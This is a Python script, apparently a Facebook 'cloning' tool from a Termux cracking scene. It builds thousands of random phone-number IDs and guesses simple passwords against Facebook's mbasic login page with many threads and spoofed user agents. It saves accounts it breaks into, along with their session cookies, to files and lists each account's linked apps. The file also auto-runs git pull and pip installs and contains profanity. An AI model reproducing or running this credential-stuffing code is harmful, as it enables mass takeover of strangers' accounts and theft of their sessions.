# ASSALAMUALAIKUM 
# SCRIPT NEOWAR JONNO THANKS ðŸ’™

import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu

try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/itz.ongkon.mallik', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/Pappar.Link.Copy.koro.kn')
import os
os.system("pkg install espeak")

#print("walcome to SEE MORE ETHICAL")

os.system('espeak -a 300 "Type User And Password"')

import getpass

attemps = 0 

while attemps < 12345677901:
    username = input('\r\033[38;5;46mEnter Username:')
    password = input('\r\033[38;5;46mEnter Password:')
    
    if username =='tamzid01' and password =='bullet-cyber':
        print('You have successfully logged in.')
        break
    else:
      print('Incorrect Please Trying')
      attemps += 1
      continue
os.system('clear')
  
logo = ("""

\033[0;31mâ–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ     \033[0;31mâ–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ      \033[0;31mâ–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ      \033[0;31mâ–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ      \033[0;31mâ–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ  
\033[0;31mâ–“â–ˆ   â–€    \033[0;31mâ–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’   \033[0;31mâ–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’   \033[0;31mâ–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’   \033[0;31mâ–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’
\033[0;31mâ–’â–ˆâ–ˆâ–ˆ      \033[0;31mâ–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’   \033[0;31mâ–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’   \033[0;31mâ–’â–ˆâ–ˆâ–‘  â–ˆâ–ˆâ–’   \033[0;31mâ–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’
\033[0;31mâ–“â–ˆ   â–„    \033[0;31mâ–’â–ˆâ–ˆâ–€â–€â–ˆâ–„     \033[0;31mâ–’â–ˆâ–ˆâ–€â–€â–ˆâ–„     \033[0;31mâ–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘   \033[0;31mâ–’â–ˆâ–ˆâ–€â–€â–ˆâ–„  
\033[0;31mâ–‘â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’   \033[0;31mâ–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’   \033[0;31mâ–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’   \033[0;31mâ–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘   \033[0;31mâ–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’
\033[0;31mâ–‘â–‘ â–’â–‘ â–‘   \033[0;31mâ–‘ â–’â–“ â–‘â–’â–“â–‘   \033[0;31mâ–‘ â–’â–“ â–‘â–’â–“â–‘   \033[0;31mâ–‘ â–’â–‘â–’â–‘â–’â–‘    \033[0;31mâ–‘ â–’â–“ â–‘â–’â–“â–‘
 \033[0;31mâ–‘ â–‘  â–‘     \033[0;31mâ–‘â–’ â–‘ â–’â–‘     \033[0;31mâ–‘â–’ â–‘ â–’â–‘     \033[0;31mâ–‘ â–’ â–’â–‘      \033[0;31mâ–‘â–’ â–‘ â–’â–‘
   \033[0;31mâ–‘        \033[0;31mâ–‘â–‘   â–‘      \033[0;31mâ–‘â–‘   â–‘    \033[0;31mâ–‘ â–‘ â–‘ â–’       \033[0;31mâ–‘â–‘   â–‘ 
   \033[0;31mâ–‘  â–‘      \033[0;31mâ–‘           \033[0;31mâ–‘            \033[0;31mâ–‘ â–‘        \033[0;31mâ–‘

\033[0;31mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
\033[0;31m[â™¥] TOOLS TYPE:\033[0;31m PREMIUM
\033[0;31m[â™¥] VERSION   :\033[0;31m 1.0
\033[0;31m[â™¥] AUTHOR    :\033[0;31m ERROR 101
\033[0;31m[â™¥] GITHUB    :\033[0;31m error 101
\033[0;31m[â™¥] FACEBOOK  :\033[0;31m à¤®à¥‹ à¤¤à¤®à¤œà¥€à¤¦ à¤¹à¥à¤¸à¥ˆà¤¨
\033[0;31mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•""")
os.system('espeak -a 300 "WELCOME MATHER FUCKER"')
def linex():
	print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :ongkon = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :ongkon = 'âˆš 2009'
        elif uid[:8] in ['10000000']        :ongkon = 'âˆš 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:ongkon = 'âˆš 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:ongkon = ' 2010'
        elif uid[:6] in ['100001']          :ongkon = 'âˆš 2010/2011'
        elif uid[:6] in ['100002','100003'] :ongkon = 'âˆš 2011/2012'
        elif uid[:6] in ['100004']          :ongkon = 'âˆš 2012/2013'
        elif uid[:6] in ['100005','100006'] :ongkon = 'âˆš 2013/2014'
        elif uid[:6] in ['100007','100008'] :ongkon = 'âˆš 2014/2015'
        elif uid[:6] in ['100009']          :ongkon = 'âˆš 2015'
        elif uid[:5] in ['10001']           :ongkon = 'âˆš 2015/2016'
        elif uid[:5] in ['10002']           :ongkon = 'âˆš 2016/2017'
        elif uid[:5] in ['10003']           :ongkon = 'âˆš 2018/2019'
        elif uid[:5] in ['10004']           :ongkon = 'âˆš 2019/2020'
        elif uid[:5] in ['10005']           :ongkon = 'âˆš 2020'
        elif uid[:5] in ['10006','10007','']:ongkon = 'âˆš 2021'
        elif uid[:5] in ['10008']           :ongkon = 'âˆš 2022'
        elif uid[:5] in ['10009']           :ongkon = 'âˆš 2023'
        else:ongkon=''
    elif len(uid) in [9,10]:
        ongkon = ' âˆš 2008/2009'
    elif len(uid)==8:
        ongkon = 'âˆš 2007/2008'
    elif len(uid)==7:
        ongkon = 'âˆš 2006/2007'
    else:ongkon=''
    return ongkon
    
#'Somrat_Ar_Real_Pappa'
#'Somrat_Akta_Bukachoda'   
    
# APK CHECK
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[0;31m[\033[1;97mâž¡ï¸\033[1;91m ]\033[0;31m Example : {xr}019,017,018,92302,92301,91778{x}')
    print(" \033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    code = random.choice([rk1,rk2,rk3])                      
    pww = input(f' \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;91m Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[1;91m[\033[1;91mâ€¢\033[1;91m]\033[1;91m EXAMPLE : 2000, 5000, 10000, 50000, 100000 \n \033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã— \n \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;92m PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"\033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=70) as manshera:
        clear()
        tl = str(len(user))
        print(f' \033[0;31m[\033[0;31mðŸ¥°\033[0;31m]\033[0;31m ð™ð™Šð™ð˜¼ð™‡ ð™„ð˜¿ð™Ž: {xr}'+tl)
        print(f'{x} \033[1;91m[\033[1;97mðŸ¥°\033[1;91m]\033[0;31m ð™ð™ƒð™„ð™Ž ð™ð™Šð™Šð™‡ð™Ž ð™‹ð™ð™Šð™ð™€ð˜¾ð™ ð˜½ð™” ð™€ð™ð™ð™Šð™')
        print(f' \033[1;91m[\033[1;97mðŸ¥°\033[1;91m]\033[0;31m ð“ð€ð‘ð†ð„ð“ ðŠðˆð‹ð‹ð„ð‘ \033[1;97m: \033[0;31m ð„ð‘ð‘ðŽð‘-ðŸðŸŽðŸ')
        print(f' \033[1;91m[\033[1;97mðŸ¥°\033[1;91m]\033[0;31m ð™ð™Šð™Šð™‡ ð™Šð™’ð™‰ð™€ð™ ð™€ð™ð™ð™Šð™ \033[1;97m: \033[0;31m ð„ð‘ð‘ðŽð‘-ðŸðŸŽðŸ')
        print(f' \033[1;91m[\033[1;97mðŸ¥°\033[1;91m]\033[0;31m ð…ð”ð‚ðŠ ðð˜ ððŽð‘ðŒð€ð‹ ð”ð’ð„ð‘ ')
        print(f" \033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} \033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
           'Referer': 'https://mbasic.facebook.com/',
           'Alt-Used': 'mbasic.facebook.com',
           'Connection': 'keep-alive',
          'Upgrade-Insecure-Requests': '1',
          'Sec-Fetch-Dest': 'document',
          'Sec-Fetch-Mode': 'navigate',
          'Sec-Fetch-Site': 'same-origin',
          'Sec-Fetch-User': '?1',
         'upgrade-insecure-requests': '1',
    'user-agent': pro,}
            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[38;5;46m [BULLET-CYBER-OKðŸ’™] ' +uid+ ' | ' +ps+    '  \n \033[1;33m[âˆš]\033[1;34mCookie = \033[38;5;46m'+coki+  '  ''  \033[1;34m')
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/BULLET-CYBER-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\x1b[38;5;196m [BAD-LUCKðŸ’”] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ERROR-101-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['BULLET-CYBER','BULLET-CYBER ','BULLET-CYBER CRACK '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['ðŸ˜†','ðŸ¸','ðŸ™ƒ','ðŸ˜ˆ','ðŸ–•','ðŸ¦…','ðŸ¦‰','ðŸŽ','ðŸ','ðŸ¦Ÿ','ðŸ§','ðŸ˜','ðŸ™‚','ðŸ¤','â™¥ï¸','ðŸ˜˜','ðŸ˜»','ðŸ˜','ðŸ˜¹','ðŸ¤£','ðŸ˜‚','ðŸ˜­','ðŸ˜','ðŸ˜œ','ðŸ¤«','ðŸ˜¶','ðŸ¥±','ðŸ˜¤','ðŸ¥µ','ðŸ˜‡','ðŸ’‹','ðŸ™ˆ','ðŸ™€','ðŸ’š','ðŸ’›','ðŸ–¤','ðŸ¤Ž','ðŸ’™','ðŸ’œ','ðŸ¦¶','ðŸ™†','ðŸŒº','ðŸŒ¸','ðŸµï¸','ðŸ','ðŸŒ¼','??','ðŸ','ðŸ¦¡','âœˆï¸','ðŸ¦›','ðŸ¦','ðŸ‡','ðŸ®','ðŸ°','ðŸ¦ƒ','ðŸ•¸ï¸','ðŸ¦‹','ðŸ’','ðŸ“','ðŸ‘','ðŸŠ','ðŸ¥­','ðŸ','ðŸŒ','ðŸŒ¶ï¸','ðŸ¥¥','ðŸ›','ðŸ¥•','ðŸ—','ðŸ†','ðŸ¥','ðŸ§€','ðŸ¤','ðŸ‡§ðŸ‡©','â˜ ï¸'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}à¼’â˜¬ð“‘ð“¤ð“›ð“›ð“”ð“£â˜¬à¼’\33[1;90m]{colo}âœ˜\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
    except:
        pass
       # sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;48mERRORðŸ’¥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
       # sys.stdout.flush()
  #  except:
      #  pass
xxr()